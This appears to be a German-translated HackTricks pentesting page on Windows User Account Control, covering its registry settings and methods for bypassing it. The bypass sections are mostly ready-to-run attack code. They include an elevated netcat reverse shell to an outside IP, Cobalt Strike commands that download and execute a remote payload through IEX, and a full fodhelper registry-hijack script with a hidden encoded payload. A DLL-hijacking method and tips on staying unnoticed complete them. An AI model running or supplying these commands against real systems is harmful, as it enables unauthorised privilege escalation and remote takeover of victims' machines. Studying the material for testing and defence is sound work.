# UAC - Benutzerkontensteuerung

{{#include ../../banners/hacktricks-training.md}}

## UAC

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) ist eine Funktion, die eine **Zustimmungsaufforderung für erhöhte Aktionen** ermöglicht. Anwendungen haben verschiedene `integrity`-Stufen, und ein Programm mit einem **hohen Level** kann Aufgaben ausführen, die **das System potenziell gefährden könnten**. Wenn UAC aktiviert ist, laufen Anwendungen und Aufgaben standardmäßig im **Sicherheitskontext eines Nicht-Administrator-Kontos**, es sei denn, ein Administrator gewährt diesen Anwendungen/Aufgaben ausdrücklich Administratorrechte, damit sie ausgeführt werden können. Es ist eine Komfortfunktion, die Administratoren vor unbeabsichtigten Änderungen schützt, gilt jedoch nicht als Sicherheitsgrenze.

Für mehr Informationen zu Integritätsstufen:


{{#ref}}
../windows-local-privilege-escalation/integrity-levels.md
{{#endref}}

Wenn UAC aktiv ist, erhält ein Administrator zwei Token: ein Standardbenutzer-Token, um reguläre Aktionen auf normalem Level auszuführen, und eines mit Administratorprivilegien.

This [page](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) erläutert ausführlich, wie UAC funktioniert und behandelt den Anmeldevorgang, die Benutzererfahrung und die UAC-Architektur. Administratoren können Sicherheitsrichtlinien verwenden, um zu konfigurieren, wie UAC für ihre Organisation auf lokaler Ebene funktioniert (mit secpol.msc) oder über Group Policy Objects (GPO) in einer Active Directory-Domänenumgebung konfiguriert und verteilt wird. Die verschiedenen Einstellungen werden [hier](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings) ausführlich erläutert. Es gibt 10 Group-Policy-Einstellungen, die für UAC festgelegt werden können. Die folgende Tabelle enthält zusätzliche Details:

| Group Policy Setting                                                                                                                                                                                                                                                                                                                                                           | Registrierungsschlüssel     | Standard-Einstellung                                           |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [User Account Control: Admin Approval Mode for the built-in Administrator account](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                     | FilterAdministratorToken    | Deaktiviert                                                  |
| [User Account Control: Allow UIAccess applications to prompt for elevation without using the secure desktop](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop) | EnableUIADesktopToggle      | Deaktiviert                                                  |
| [User Account Control: Behavior of the elevation prompt for administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                     | ConsentPromptBehaviorAdmin  | Prompt for consent for non-Windows binaries                  |
| [User Account Control: Behavior of the elevation prompt for standard users](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                   | ConsentPromptBehaviorUser   | Prompt for credentials on the secure desktop                 |
| [User Account Control: Detect application installations and prompt for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                       | EnableInstallerDetection    | Aktiviert (Standard für Home) Deaktiviert (Standard für Enterprise) |
| [User Account Control: Only elevate executables that are signed and validated](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | ValidateAdminCodeSignatures | Deaktiviert                                                  |
| [User Account Control: Only elevate UIAccess applications that are installed in secure locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                       | EnableSecureUIAPaths        | Aktiviert                                                     |
| [User Account Control: Run all administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                               | EnableLUA                   | Aktiviert                                                     |
| [User Account Control: Switch to the secure desktop when prompting for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                       | PromptOnSecureDesktop       | Aktiviert                                                     |
| [User Account Control: Virtualize file and registry write failures to per-user locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                       | EnableVirtualization        | Aktiviert                                                     |

### UAC-Bypass-Theorie

Einige Programme werden **automatisch erhöht (autoelevated)**, wenn der **Benutzer zur Administratorgruppe gehört**. Diese Binärdateien haben in ihrem _**Manifest**_ die Option _**autoElevate**_ mit dem Wert _**True**_. Die Binärdatei muss außerdem **von Microsoft signiert** sein.

Viele Auto-Elevate-Prozesse stellen **Funktionalität über COM-Objekte oder RPC-Server** bereit, die von Prozessen mit medium-Integrität (normale Benutzerrechte) aufgerufen werden können. Beachte, dass COM (Component Object Model) und RPC (Remote Procedure Call) Methoden sind, die Windows-Programme zur Kommunikation und Ausführung von Funktionen zwischen Prozessen verwenden. Zum Beispiel ist das **`IFileOperation COM object`** dafür vorgesehen, Dateioperationen (Kopieren, Löschen, Verschieben) zu handhaben und kann Privilegien automatisch erhöhen, ohne eine Aufforderung anzuzeigen.

Es werden möglicherweise Prüfungen durchgeführt, etwa ob der Prozess aus dem **System32-Verzeichnis** gestartet wurde. Das lässt sich zum Beispiel umgehen, indem man in **explorer.exe** oder eine andere in System32 befindliche ausführbare Datei injiziert.

Eine weitere Möglichkeit, diese Prüfungen zu umgehen, besteht darin, die **PEB zu verändern**. Jeder Prozess unter Windows hat ein Process Environment Block (PEB), das wichtige Daten über den Prozess enthält, etwa den Pfad zur ausführbaren Datei. Durch Ändern der PEB können Angreifer den Ort ihres eigenen bösartigen Prozesses fälschen (spoofen), sodass er so aussieht, als würde er aus einem vertrauenswürdigen Verzeichnis (z. B. system32) ausgeführt. Diese gefälschten Informationen veranlassen das COM-Objekt dazu, die Privilegien automatisch zu erhöhen, ohne den Benutzer aufzufordern.

Um die **UAC** zu **umgehen** (Erhöhung von **medium** auf **high** Integritätsstufe) nutzen einige Angreifer solche Binärdateien, um **beliebigen Code auszuführen**, da dieser dann aus einem Prozess mit **hoher Integrität** ausgeführt wird.

Du kannst das _**Manifest**_ einer Binärdatei mit dem Tool _**sigcheck.exe**_ von Sysinternals prüfen. (`sigcheck.exe -m <file>`) Und du kannst die **Integritätsstufe** der Prozesse mit _Process Explorer_ oder _Process Monitor_ (von Sysinternals) sehen.

### UAC prüfen

Um zu bestätigen, ob UAC aktiviert ist, führe aus:
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
EnableLUA    REG_DWORD    0x1
```
Wenn es **`1`** ist, dann ist UAC **aktiviert**, wenn es **`0`** ist oder es **nicht existiert**, dann ist UAC **inaktiv**.

Dann prüfe, **welche Stufe** konfiguriert ist:
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
ConsentPromptBehaviorAdmin    REG_DWORD    0x5
```
- If **`0`** then, UAC won't prompt (like **disabled**)  
- If **`1`** the admin is **asked for username and password** to execute the binary with high rights (on Secure Desktop)  
- If **`2`** (**Always notify me**) UAC will always ask for confirmation to the administrator when he tries to execute something with high privileges (on Secure Desktop)  
- If **`3`** like `1` but not necessary on Secure Desktop  
- If **`4`** like `2` but not necessary on Secure Desktop  
- if **`5`**(**default**) it will ask the administrator to confirm to run non Windows binaries with high privileges

Dann sollten Sie sich den Wert von **`LocalAccountTokenFilterPolicy`** anschauen\
Wenn der Wert **`0`** ist, kann nur der **RID 500** Benutzer (**built-in Administrator**) **Admin-Aufgaben ohne UAC** ausführen, und wenn er `1` ist, können **alle Konten in der Gruppe "Administrators"** dies tun.

Und schließlich schauen Sie sich den Wert des Schlüssels **`FilterAdministratorToken`** an\
Wenn **`0`** (Standard), kann das **built-in Administrator**-Konto Remote-Administrationsaufgaben ausführen, und wenn **`1`**, kann das built-in Administrator-Konto **keine** Remote-Administrationsaufgaben ausführen, es sei denn `LocalAccountTokenFilterPolicy` ist auf `1` gesetzt.

#### Zusammenfassung

- If `EnableLUA=0` or **doesn't exist**, **no UAC for anyone**  
- If `EnableLua=1` and **`LocalAccountTokenFilterPolicy=1` , No UAC for anyone**  
- If `EnableLua=1` and **`LocalAccountTokenFilterPolicy=0` and `FilterAdministratorToken=0`, No UAC for RID 500 (Built-in Administrator)**  
- If `EnableLua=1` and **`LocalAccountTokenFilterPolicy=0` and `FilterAdministratorToken=1`, UAC for everyone**

All this information can be gathered using the **metasploit** module: `post/windows/gather/win_privs`

Sie können auch die Gruppen Ihres Benutzers prüfen und die Integritätsstufe abrufen:
```
net user %username%
whoami /groups | findstr Level
```
## UAC bypass

> [!TIP]
> Beachte, dass wenn du grafischen Zugriff auf das Opfer hast, UAC bypass sehr einfach ist, da du einfach auf "Yes" klicken kannst, wenn die UAC-Eingabeaufforderung erscheint

Der UAC bypass wird in folgender Situation benötigt: **der UAC ist aktiviert, dein Prozess läuft in einem medium integrity context, und dein Benutzer gehört zur administrators group**.

Es ist wichtig zu erwähnen, dass es **viel schwieriger ist, den UAC zu umgehen, wenn er auf dem höchsten Sicherheitslevel (Always) steht, als bei einem der anderen Levels (Default).**

### UAC disabled

Wenn UAC bereits deaktiviert ist (`ConsentPromptBehaviorAdmin` ist **`0`**) kannst du **eine reverse shell mit admin privileges ausführen** (high integrity level) mit etwas wie:
```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```
#### UAC bypass with token duplication

- [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
- [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### **Sehr** grundlegender UAC "bypass" (voller Zugriff auf das Dateisystem)

Wenn du eine Shell mit einem Benutzer hast, der zur Administrators-Gruppe gehört, kannst du **das C$-Share** über SMB lokal als neues Laufwerk mounten und wirst **Zugriff auf alles im Dateisystem** haben (sogar auf den Home-Ordner des Administrator-Kontos).

> [!WARNING]
> **Anscheinend funktioniert dieser Trick nicht mehr**
```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```
### UAC bypass mit cobalt strike

Die Cobalt Strike-Techniken funktionieren nur, wenn UAC nicht auf die höchste Sicherheitsstufe eingestellt ist.
```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```
**Empire** und **Metasploit** haben auch mehrere Module, um die **UAC** zu **bypass**.

### KRBUACBypass

Dokumentation und Tool unter [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)

### UAC bypass exploits

[**UACME** ](https://github.com/hfiref0x/UACME), welches eine **compilation** mehrerer UAC bypass exploits ist. Beachte, dass du **compile UACME using visual studio or msbuild** musst. Die compilation wird mehrere ausführbare Dateien erstellen (wie `Source\Akagi\outout\x64\Debug\Akagi.exe`), du musst wissen, **welches du brauchst.**

Du solltest **vorsichtig sein**, weil einige bypasses einige andere Programme **auffordern** könnten, die den **Benutzer** **alarmieren**, dass etwas passiert.

UACME enthält die **Build-Version, ab der jede Technik funktionierte**. Du kannst nach einer Technik suchen, die deine Versionen betrifft:
```
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```
Außerdem erhält man mit [this](https://en.wikipedia.org/wiki/Windows_10_version_history) die Windows-Version `1607` aus den Build-Versionen.

### UAC Bypass – fodhelper.exe (Registry hijack)

Die vertrauenswürdige Binärdatei `fodhelper.exe` wird auf modernen Windows-Versionen automatisch mit erhöhten Rechten gestartet. Beim Start fragt sie den untenstehenden per-user-Registry-Pfad ab, ohne das `DelegateExecute`-Verb zu validieren. Dort einen Befehl zu platzieren erlaubt einem Medium Integrity-Prozess (der Benutzer ist in Administrators), einen High Integrity-Prozess zu erzeugen, ohne dass ein UAC prompt erscheint.

Registry path queried by fodhelper:
```
HKCU\Software\Classes\ms-settings\Shell\Open\command
```
PowerShell-Schritte (set your payload, then trigger):
```powershell
# Optional: from a 32-bit shell on 64-bit Windows, spawn a 64-bit PowerShell for stability
C:\\Windows\\sysnative\\WindowsPowerShell\\v1.0\\powershell -nop -w hidden -c "$PSVersionTable.PSEdition"

# 1) Create the vulnerable key and values
New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null

# 2) Set default command to your payload (example: reverse shell or cmd)
# Replace <BASE64_PS> with your base64-encoded PowerShell (or any command)
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -e <BASE64_PS>" -Force

# 3) Trigger auto-elevation
Start-Process -FilePath "C:\\Windows\\System32\\fodhelper.exe"

# 4) (Recommended) Cleanup
Remove-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open" -Recurse -Force
```
Hinweise:
- Funktioniert, wenn der aktuelle Benutzer Mitglied der Administrators ist und das UAC-Level standard/locker ist (nicht Always Notify mit zusätzlichen Beschränkungen).
- Verwende den `sysnative`-Pfad, um eine 64-Bit PowerShell aus einem 32-Bit-Prozess auf 64-Bit-Windows zu starten.
- Die Payload kann jeder Befehl sein (PowerShell, cmd oder ein EXE-Pfad). Vermeide auffordernde UIs, um unauffällig zu bleiben.

#### Weitere UAC bypass

**Alle** die hier verwendeten Techniken, um AUC zu umgehen, **erfordern** eine **voll interaktive Shell** mit dem Opfer (eine normale nc.exe-Shell reicht nicht).

Du kannst das mit einer **meterpreter**-Sitzung erreichen. Migriere zu einem **Prozess**, dessen **Session**-Wert **1** ist:

![](<../../images/image (863).png>)

(_explorer.exe_ sollte funktionieren)

### UAC Bypass mit GUI

Wenn du Zugriff auf eine **GUI hast, kannst du einfach das UAC-Dialogfeld akzeptieren**, wenn es erscheint; du brauchst dann eigentlich keinen Bypass. Daher ermöglicht dir der Zugriff auf eine GUI, das UAC zu umgehen.

Außerdem: Wenn du eine GUI-Sitzung übernimmst, die jemand gerade benutzt hat (möglicherweise per RDP), laufen dort oft **einige Tools als Administrator**, von denen du z. B. eine **cmd** **als admin** direkt ausführen könntest, ohne erneut von UAC aufgefordert zu werden, wie z. B. [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). Das kann etwas **stealthy** sein.

### Auffälliger brute-force UAC bypass

Wenn es dir egal ist, auffällig zu sein, kannst du immer etwas wie [**https://github.com/Chainski/ForceAdmin**](https://github.com/Chainski/ForceAdmin) ausführen, das **fortlaufend um Erhöhung der Berechtigungen bittet, bis der Benutzer zustimmt**.

### Eigener Bypass - Grundlegende UAC bypass Methodik

Wenn du dir **UACME** ansiehst, fällt auf, dass **die meisten UAC-Bypässe eine Dll Hijacking Vulnerability ausnutzen** (hauptsächlich indem die bösartige DLL nach _C:\Windows\System32_ geschrieben wird). [Read this to learn how to find a Dll Hijacking vulnerability](../windows-local-privilege-escalation/dll-hijacking/index.html).

1. Finde ein Binary, das **autoelevate** (prüfe, dass es beim Ausführen in einem hohen Integritätslevel läuft).
2. Mit procmon suche nach "**NAME NOT FOUND**"-Ereignissen, die für **DLL Hijacking** anfällig sein können.
3. Du musst wahrscheinlich die DLL in einigen **geschützten Pfaden** (wie C:\Windows\System32) **schreiben**, in denen du keine Schreibrechte hast. Das kannst du umgehen mit:
1. **wusa.exe**: Windows 7, 8 und 8.1. Ermöglicht das Extrahieren des Inhalts einer CAB-Datei in geschützte Pfade (da dieses Tool mit hoher Integritätsstufe ausgeführt wird).
2. **IFileOperation**: Windows 10.
4. Bereite ein **script** vor, das deine DLL in den geschützten Pfad kopiert und das verwundbare und autoelevated Binary ausführt.

### Eine andere UAC bypass technik

Besteht darin zu beobachten, ob ein **autoElevated binary** versucht, aus der **registry** den **Name/Pfad** eines **binary** oder **command** zu **lesen**, der **ausgeführt** werden soll (das ist besonders interessant, wenn das Binary diese Informationen in der **HKCU** sucht).

## Referenzen
- [HTB: Rainbow – SEH overflow to RCE over HTTP (0xdf) – fodhelper UAC bypass steps](https://0xdf.gitlab.io/2025/08/07/htb-rainbow.html)
- [LOLBAS: Fodhelper.exe](https://lolbas-project.github.io/lolbas/Binaries/Fodhelper/)
- [Microsoft Docs – How User Account Control works](https://learn.microsoft.com/windows/security/identity-protection/user-account-control/how-user-account-control-works)
- [UACME – UAC bypass techniques collection](https://github.com/hfiref0x/UACME)

{{#include ../../banners/hacktricks-training.md}}
